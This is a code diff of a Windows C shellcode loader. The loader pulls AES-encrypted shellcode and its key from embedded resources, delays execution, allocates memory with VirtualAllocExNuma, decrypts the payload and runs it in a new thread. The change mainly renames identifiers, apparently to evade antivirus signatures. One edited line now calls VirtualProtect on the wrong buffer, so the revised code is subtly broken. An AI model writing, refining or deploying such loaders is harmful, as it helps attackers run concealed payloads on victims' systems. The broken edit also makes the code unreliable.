@@ -5,7 +5,7 @@
 #pragma comment (lib, "user32.lib")
 
 // Function to load resource data into memory
-void coolresload(const char* resName, unsigned char** data, DWORD* size) {
+void coolredasload(const char* resName, unsigned char** data, DWORD* size) {
     HMODULE hModule = GetModuleHandle(NULL);
     HRSRC hResource = FindResource(hModule, resName, RT_RCDATA);
     
@@ -34,20 +34,16 @@ void DECaes(char* coolcode, DWORD coolcodeLen, char* key, DWORD keyLen) {
 }
 
 
-// Function to print hex representation of the byte array
-
-//}
-
 int main() {
     Sleep(2000);  // Sleep to mimic real-world attack time delay
 
     unsigned char* AESkey;
     DWORD AESkeyLen;
-    coolresload("AESKEY", &AESkey, &AESkeyLen);  // Load AES key
+    coolredasload("AESKEY", &AESkey, &AESkeyLen);  // Load AES key
 
     unsigned char* AESCode;
     DWORD AESCodeLen;
-    coolresload("AESCODE", &AESCode, &AESCodeLen);  // Load AES shellcode
+    coolredasload("AESCODE", &AESCode, &AESCodeLen);  // Load AES shellcode
 
     // Print the AES key and shellcode for debugging (as hex)
      unsigned char keykum[AESkeyLen];
@@ -55,18 +51,18 @@ int main() {
 
     // Copy the data into the arrays
     memcpy(keykum, AESkey, AESkeyLen);
-    memcpy(codee, AESCode, AESCodeLen);
+    memcpy(codkuma, AESCode, AESCodeLen);
 
     // Print the AES key and shellcode for debugging (as hex)
     
 
     LPVOID coollo = VirtualAllocExNuma(GetCurrentProcess(), NULL, AESCodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0xFFFFFFFF);
 
-    DECaes((char*)codee, sizeof(codee), keykum, sizeof(keykum));  // Decrypt AES shellcode
+    DECaes((char*)codkuma, sizeof(codkuma), keykum, sizeof(keykum));  // Decrypt AES shellcode
 
-    memcpy(coollo, codee, sizeof(codee));  
+    memcpy(coollo, codkuma, sizeof(codkuma));  
     DWORD oldProtect;
-    VirtualProtect(coollo, sizeof(codee), PAGE_EXECUTE_READ, &oldProtect);  
+    VirtualProtect(codkuma, sizeof(codkuma), PAGE_EXECUTE_READ, &oldProtect);  
 
     HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)coollo, NULL, 0, NULL);  
     WaitForSingleObject(tHandle, INFINITE);  // Wait for thread to finish
